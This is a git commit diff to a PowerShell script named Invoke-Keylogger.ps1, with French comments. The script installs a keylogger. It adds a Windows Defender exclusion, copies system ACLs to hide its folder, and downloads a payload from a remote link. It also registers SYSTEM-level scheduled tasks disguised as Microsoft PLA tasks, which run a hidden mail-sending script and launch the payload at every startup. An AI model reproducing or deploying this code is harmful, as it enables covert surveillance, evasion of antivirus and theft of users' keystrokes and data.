309e7fd5837b05493fb2d86b3a74f52caeb8d44c
Hilan Meyran <67104154+ShawnHeyli@users.noreply.github.com>
2021-06-29 10:18:01 +0200

    Add files via upload

--- Invoke-Keylogger.ps1
+++ Invoke-Keylogger.ps1
@@ -14,7 +14,7 @@ Set-ItemProperty -Path $FolderPath -Name LastWriteTime -Value $Date #Applique la
 Get-Acl -Path "C:\Windows\PLA\Rules" | Set-Acl -Path $FolderPath #Copie les droits de $PropertyCopyFolder et les applique a notré répertoire pour le rendre innacessible
 Add-MpPreference -ExclusionPath $FolderPath #On exclue le répertoire de la liste de recherche de windows defender
 
-### Executable
+### Téléchargement du payload ###
 (new-object System.Net.WebClient).DownloadFile("$DownloadLink", "$FolderPath$FileName")#On télécharge le payload
 
 ###### MAIL ######
@@ -30,7 +30,7 @@ $ExecutableCheckerDownloadLink = "https://raw.githubusercontent.com/ShawnHeyli/T
 
 ### Créationd de la tache planifiée qui va éxecuter le script d'envoi de mail tout les jours ###
 $ScheduleAction= New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -ExecutionPolicy Bypass iex $FolderPath$MailScriptName" # La commande qu'execute la tache planifiée
-$ScheduleTrigger= New-ScheduledTaskTrigger -Daily -At 2pm # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
+$ScheduleTrigger= New-ScheduledTaskTrigger -AtStartup # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
 $SchedulePrincipal= New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest #Execute le script en tant que systeme pour ne pas avoir pas de pop up powershell et le lance en administrateur
 $ScheduleSettings= New-ScheduledTaskSettingsSet -StartWhenAvailable -RunOnlyIfNetworkAvailable #Si le PC n'est pas allumé lors d'un Trigger on active le script dès qu'on peut au prochain démarrage / -RunOnlyIfNetworkAvailable #Si le script utlise internet (ex: Envoyer un mail) / Le dernier paramètre sert a rendre invisible le pop-up du script
 #$ScheduleUser="Microsoft Corporation"
@@ -39,11 +39,10 @@ $ScheduleDescription="Performance Logs and Alerts (PLA) provides the ability to 
 
 Register-ScheduledTask -Force -Action $ScheduleAction -Trigger $ScheduleTrigger -Principal $SchedulePrincipal -Settings $ScheduleSettings -TaskName $ScheduleName -TaskPath \Microsoft\Windows\PLA -Description $ScheduleDescription | Out-Null #Création d'une tâche planifié
 
-### Téléchargement du checker pour l'executable ###
-(new-object System.Net.WebClient).DownloadFile("$ExecutableCheckerDownloadLink", "$FolderPath$ExecutableCheckerName")
+### Tache planifiée qui lance l'executable a chaque démarrage ###
 
-$ScheduleAction= New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -ExecutionPolicy Bypass iex $FolderPath$ExecutableCheckerName" # La commande qu'execute la tache planifiée
-$ScheduleTrigger= New-ScheduledTaskTrigger -Daily -At 2am # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
+$ScheduleAction= New-ScheduledTaskAction -Execute $FolderPath$FileName# La commande qu'execute la tache planifiée
+$ScheduleTrigger= New-ScheduledTaskTrigger -AtStartup # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
 $SchedulePrincipal= New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest #Execute le script en tant que systeme pour ne pas avoir pas de pop up powershell et le lance en administrateur
 $ScheduleSettings= New-ScheduledTaskSettingsSet -StartWhenAvailable #Si le PC n'est pas allumé lors d'un Trigger on active le script dès qu'on peut au prochain démarrage / -RunOnlyIfNetworkAvailable #Si le script utlise internet (ex: Envoyer un mail) / Le dernier paramètre sert a rendre invisible le pop-up du script
 #$ScheduleUser="Microsoft Corporation"
@@ -51,9 +50,3 @@ $ScheduleName="PLA Exception Rules"
 $ScheduleDescription="Performance Logs and Alerts (PLA) provides the ability to generate alert notifications based on performance counter thresholds. You can also use PLA to query performance data, create event tracing sessions, capture a computer's configuration, and trace API calls in some Win32 system DLLs."
 
 Register-ScheduledTask -Force -Action $ScheduleAction -Trigger $ScheduleTrigger -Principal $SchedulePrincipal -Settings $ScheduleSettings -TaskName $ScheduleName -TaskPath \Microsoft\Windows\PLA -Description $ScheduleDescription | Out-Null #Création d'une tâche planifié
-
-
-### Téléchargement & Execution du payload ###
-
-#(new-object System.Net.WebClient).DownloadFile("$DownloadLink", "$FolderPath$FileName")#On télécharge le payload
-#& $FolderPath$FileName #On execute le payload
